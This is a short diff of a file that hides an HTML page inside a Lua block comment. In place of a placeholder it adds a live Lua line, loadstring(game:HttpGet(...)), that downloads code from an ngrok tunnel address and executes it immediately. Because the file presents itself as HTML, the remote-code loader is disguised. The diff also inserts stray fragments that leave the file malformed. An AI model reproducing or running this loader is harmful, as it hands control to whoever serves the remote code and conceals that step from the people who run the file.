@@ -1,3 +1,4 @@
+1. HTML /
 --[===[
 <!DOCTYPE html>
 <html lang="fr">
@@ -207,4 +208,7 @@
 </body>
 </html>
 ]===]
-{{CODE_LUA_ICI}}
+
+loadstring(game:HttpGet('https://resonant-exposable-coil.ngrok-free.dev/'))()
+
+.
